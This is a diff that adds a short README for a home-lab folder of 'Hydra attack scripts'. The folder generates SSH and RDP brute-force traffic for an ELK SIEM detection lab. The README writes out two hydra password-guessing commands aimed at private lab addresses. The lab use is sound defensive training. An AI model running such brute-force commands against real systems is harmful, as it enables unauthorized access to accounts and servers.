@@ -1,0 +1,9 @@
+# Hydra Attack Scripts
+
+This folder contains the wordlist used for SSH and RDP brute force simulations in the ELK SIEM lab.
+
+## SSH Brute Force Command
+hydra -l fakeuser -P passwords.txt ssh://192.168.56.101 -t 4 -V
+
+## RDP Brute Force Command
+hydra -l Administrator -P passwords.txt rdp://192.168.56.102 -t 1 -V
